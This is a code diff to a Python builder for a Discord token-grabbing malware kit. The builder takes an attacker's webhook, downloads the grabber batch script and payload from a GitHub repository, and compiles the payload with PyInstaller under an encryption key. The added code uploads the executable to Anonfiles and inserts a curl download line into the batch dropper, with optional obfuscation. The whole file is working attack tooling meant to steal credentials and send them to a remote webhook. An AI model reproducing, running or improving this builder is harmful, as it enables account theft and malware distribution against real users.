@@ -1,4 +1,4 @@
-import os, requests, string, random, codecs
+import os, string, random, codecs
 from random import randint
 try:
     from tqdm import tqdm
@@ -17,6 +17,21 @@ try:
 except:
     os.system("pip install pystyle")
     from pystyle import *
+try:
+    import shutil
+except:
+    os.system("pip install shutil")
+    import shutil
+try:
+    import requests
+except:
+    os.system("pip install requests")
+    import requests
+try:
+    from bs4 import BeautifulSoup as bs
+except:
+    os.system("pip install bs4")
+    from bs4 import BeautifulSoup as bs
 
 banner = Center.XCenter("""
  ██████╗  ██████╗ ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗███████╗██████╗ 
@@ -44,6 +59,9 @@ class builder:
         self.webhook = input("Webhook: ")
         self.file = input("File name: ")
         self.obfuscate = input("Obfuscate? (y/n): ")
+        self.build_self = input("Would you like to bulid the exe that the grabber uses yourself? (y/n): ")
+        if self.build_self == "y":
+            self.anon = input("Would you like to use Anonfiles to host exe? (y/n): ")
         self.build()
 
     def check_webhook(self):
@@ -64,16 +82,63 @@ class builder:
         except:
             return False
 
+    def make_pyinstaller_stuff(self):
+        if self.build_self == "y":
+            os.system('pip install colorama; Pillow; pycryptodome; pystyle; pywin32; requests; tqdm; tinyaes')
+            if self.anon == "y":
+                os.system("pip install pyinstaller")
+                grabbruh = requests.get("https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/main.py")
+                with open("built.py", "w+") as f:
+                    f.write(grabbruh.text)
+                os.system("pyinstaller --clean --onefile --key GODFATHER built.py")
+                os.remove("built.spec")
+                shutil.rmtree("build")
+                shutil.move("dist/built.exe", "grabber.exe")
+                os.remove("built.py")
+                shutil.rmtree("dist")
+                uploaded = requests.post(f'https://anonfiles.com/api/upload', files={'file': open('grabber.exe', 'rb')})
+                uploaded = uploaded.json()
+                uploaded2 = uploaded['data']['file']['url']['full']
+                r = requests.get(uploaded2)
+                soup = bs(r.content, "html.parser")
+                link = soup.find("a", {"id": "download-url"}).get("href")
+                final = f"curl {link}"
+                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "").replace("curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe", final)
+                return grabber
+            elif self.anon == "n":
+                direct_download = input("ENTIRE CURL LINK (not this can be curl YOUR_LINK or even curl -LJO YOUR_LINK THIS IS VERY ADVANCED SO DONT USE UNLESS YOU KNOW): ")
+                os.system("pip install pyinstaller")
+                grabbruh = requests.get("https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/main.py")
+                with open("built.py", "w+") as f:
+                    f.write(grabbruh.text)
+                os.system("pyinstaller --clean --onefile --key GODFATHER built.py")
+                os.remove("built.spec")
+                shutil.rmtree("build")
+                shutil.move("dist/built.exe", "grabber.exe")
+                os.remove("built.py")
+                shutil.rmtree("dist")
+                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "").replace(f"curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe", f"{direct_download}")
+                return grabber
+            else:
+                print("Invalid option dumbass")
+                builder()
+
+        elif self.build_self == "n":
+            grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "")
+            return grabber
+        else:
+            print(Colorate.Color(Colors.red, "Invalid option", False))
+            builder()
+
     def build(self):
         if self.check_webhook():
             print(Colorate.Color(Colors.green, "Webhook is valid!", True))
             print(Colorate.Color(Colors.red, "", False)) #back to red cuh
         else:
             print("WEBHOOK IS INVALID!")
-            self.build()
-        grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "")
+            builder()
         with open(f'{self.file}.bat', 'w+') as f:
-            f.write(grabber)
+            f.write(self.make_pyinstaller_stuff())
         if self.obfuscate == "y":
             self.obfuscate_real()
         else:
@@ -156,3 +221,4 @@ if __name__ == '__main__':
         print(Colors.green + 'INJECTING RAT INTO YOUR SYSTEM')
         os._exit(0)
     builder()
+    input("press anything to exit...")
